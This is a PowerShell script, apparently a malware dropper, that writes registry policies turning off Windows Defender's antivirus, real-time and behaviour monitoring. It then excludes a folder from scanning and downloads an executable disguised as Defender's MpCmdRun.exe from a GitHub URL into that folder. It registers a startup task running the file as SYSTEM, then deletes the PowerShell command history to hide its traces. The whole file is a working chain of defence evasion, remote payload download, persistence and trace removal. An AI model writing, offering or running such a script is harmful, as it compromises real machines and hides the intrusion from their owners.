# Define the base registry path
$basePath = "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender"

# Create the required DWORD values
$values = @{
    "DisableAntiSpyware"              = 1
    "DisableRealtimeMonitoring"       = 1
    "DisableAntiVirus"                = 1
    "DisableSpecialRunningModes"      = 1
    "DisableRoutinelyTakingAction"    = 1
    "ServiceKeepAlive"                = 1
}

# Iterate through each value and create it in the registry
foreach ($key in $values.Keys) {
    Set-ItemProperty -Path $basePath -Name $key -Value $values[$key] -Type DWord
}

# Create a new key: Real-Time Protection
$realTimeProtectionPath = Join-Path $basePath "Real-Time Protection"
New-Item -Path $realTimeProtectionPath -Force

# Create the required DWORD values under Real-Time Protection
$realTimeValues = @{
    "DisableBehaviorMonitoring"   = 1
    "DisableOnAccessProtection"   = 1
    "DisableRealtimeMonitoring"   = 1
    "DisableScanOnRealtimeEnable" = 1
}

# Iterate through each value and create it in the Real-Time Protection key
foreach ($key in $realTimeValues.Keys) {
    Set-ItemProperty -Path $realTimeProtectionPath -Name $key -Value $realTimeValues[$key] -Type DWord
}

# Create a new key: Signature Updates
$signatureUpdatesPath = Join-Path $basePath "Signature Updates"
New-Item -Path $signatureUpdatesPath -Force

# Create the required DWORD value under Signature Updates
Set-ItemProperty -Path $signatureUpdatesPath -Name "ForceUpdateFromMU" -Value 1 -Type DWord

# Create a new key: Spynet
$spynetPath = Join-Path $basePath "Spynet"
New-Item -Path $spynetPath -Force

# Create the required DWORD value under Spynet
Set-ItemProperty -Path $spynetPath -Name "DisableBlockAtFirstSeen" -Value 1 -Type DWord

Write-Output "Registry keys and values created successfully."

# Set the execution policy to allow running scripts that are downloaded from the internet
Set-ExecutionPolicy -ExecutionPolicy RemoteSigned -Scope CurrentUser -Force

# Define the path to exclude from Windows Defender scans
$pathToExclude = "C:\Windows\DiagTrack\Settings"

# Add the exclusion path to Windows Defender
Add-MpPreference -ExclusionPath $pathToExclude

# Print a confirmation message to the console
Write-Host "Exclusion added successfully for: $pathToExclude"

# URL of the executable to download
$urlMpCmdRun = "https://github.com/XXS437/M/blob/main/MpCmdRun%20%20L.exe?raw=true"

# Define the hidden directory where the executable will be stored
$hiddenDirectoryMpCmdRun = "C:\Windows\DiagTrack\Settings"

# Define the full destination path for the downloaded executable
$destinationPathMpCmdRun = "$hiddenDirectoryMpCmdRun\MpCmdRun.exe"

# Check if the hidden directory exists, and create it if it does not
if (-not (Test-Path -Path $hiddenDirectoryMpCmdRun)) {
    New-Item -Path $hiddenDirectoryMpCmdRun -ItemType Directory -Force
}

# Download the executable from the specified URL and save it to the destination path
Invoke-WebRequest -Uri $urlMpCmdRun -OutFile $destinationPathMpCmdRun

# Create a scheduled task action to execute the downloaded executable
$action = New-ScheduledTaskAction -Execute $destinationPathMpCmdRun

# Set the trigger to run the task at system startup
$trigger = New-ScheduledTaskTrigger -AtStartup

# Set the principal to run the task with system privileges
$principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest

# Define additional task settings
$settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable

# Register the scheduled task with the specified action, trigger, principal, and settings
Register-ScheduledTask -TaskName "MpCmdRunTask" -Action $action -Trigger $trigger -Principal $principal -Settings $settings

# Define the path to the PowerShell command history file
$historyPath = [System.IO.Path]::Combine($env:APPDATA, 'Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt')

# Remove the PowerShell command history file to clear any trace of commands run
Remove-Item -Path $historyPath
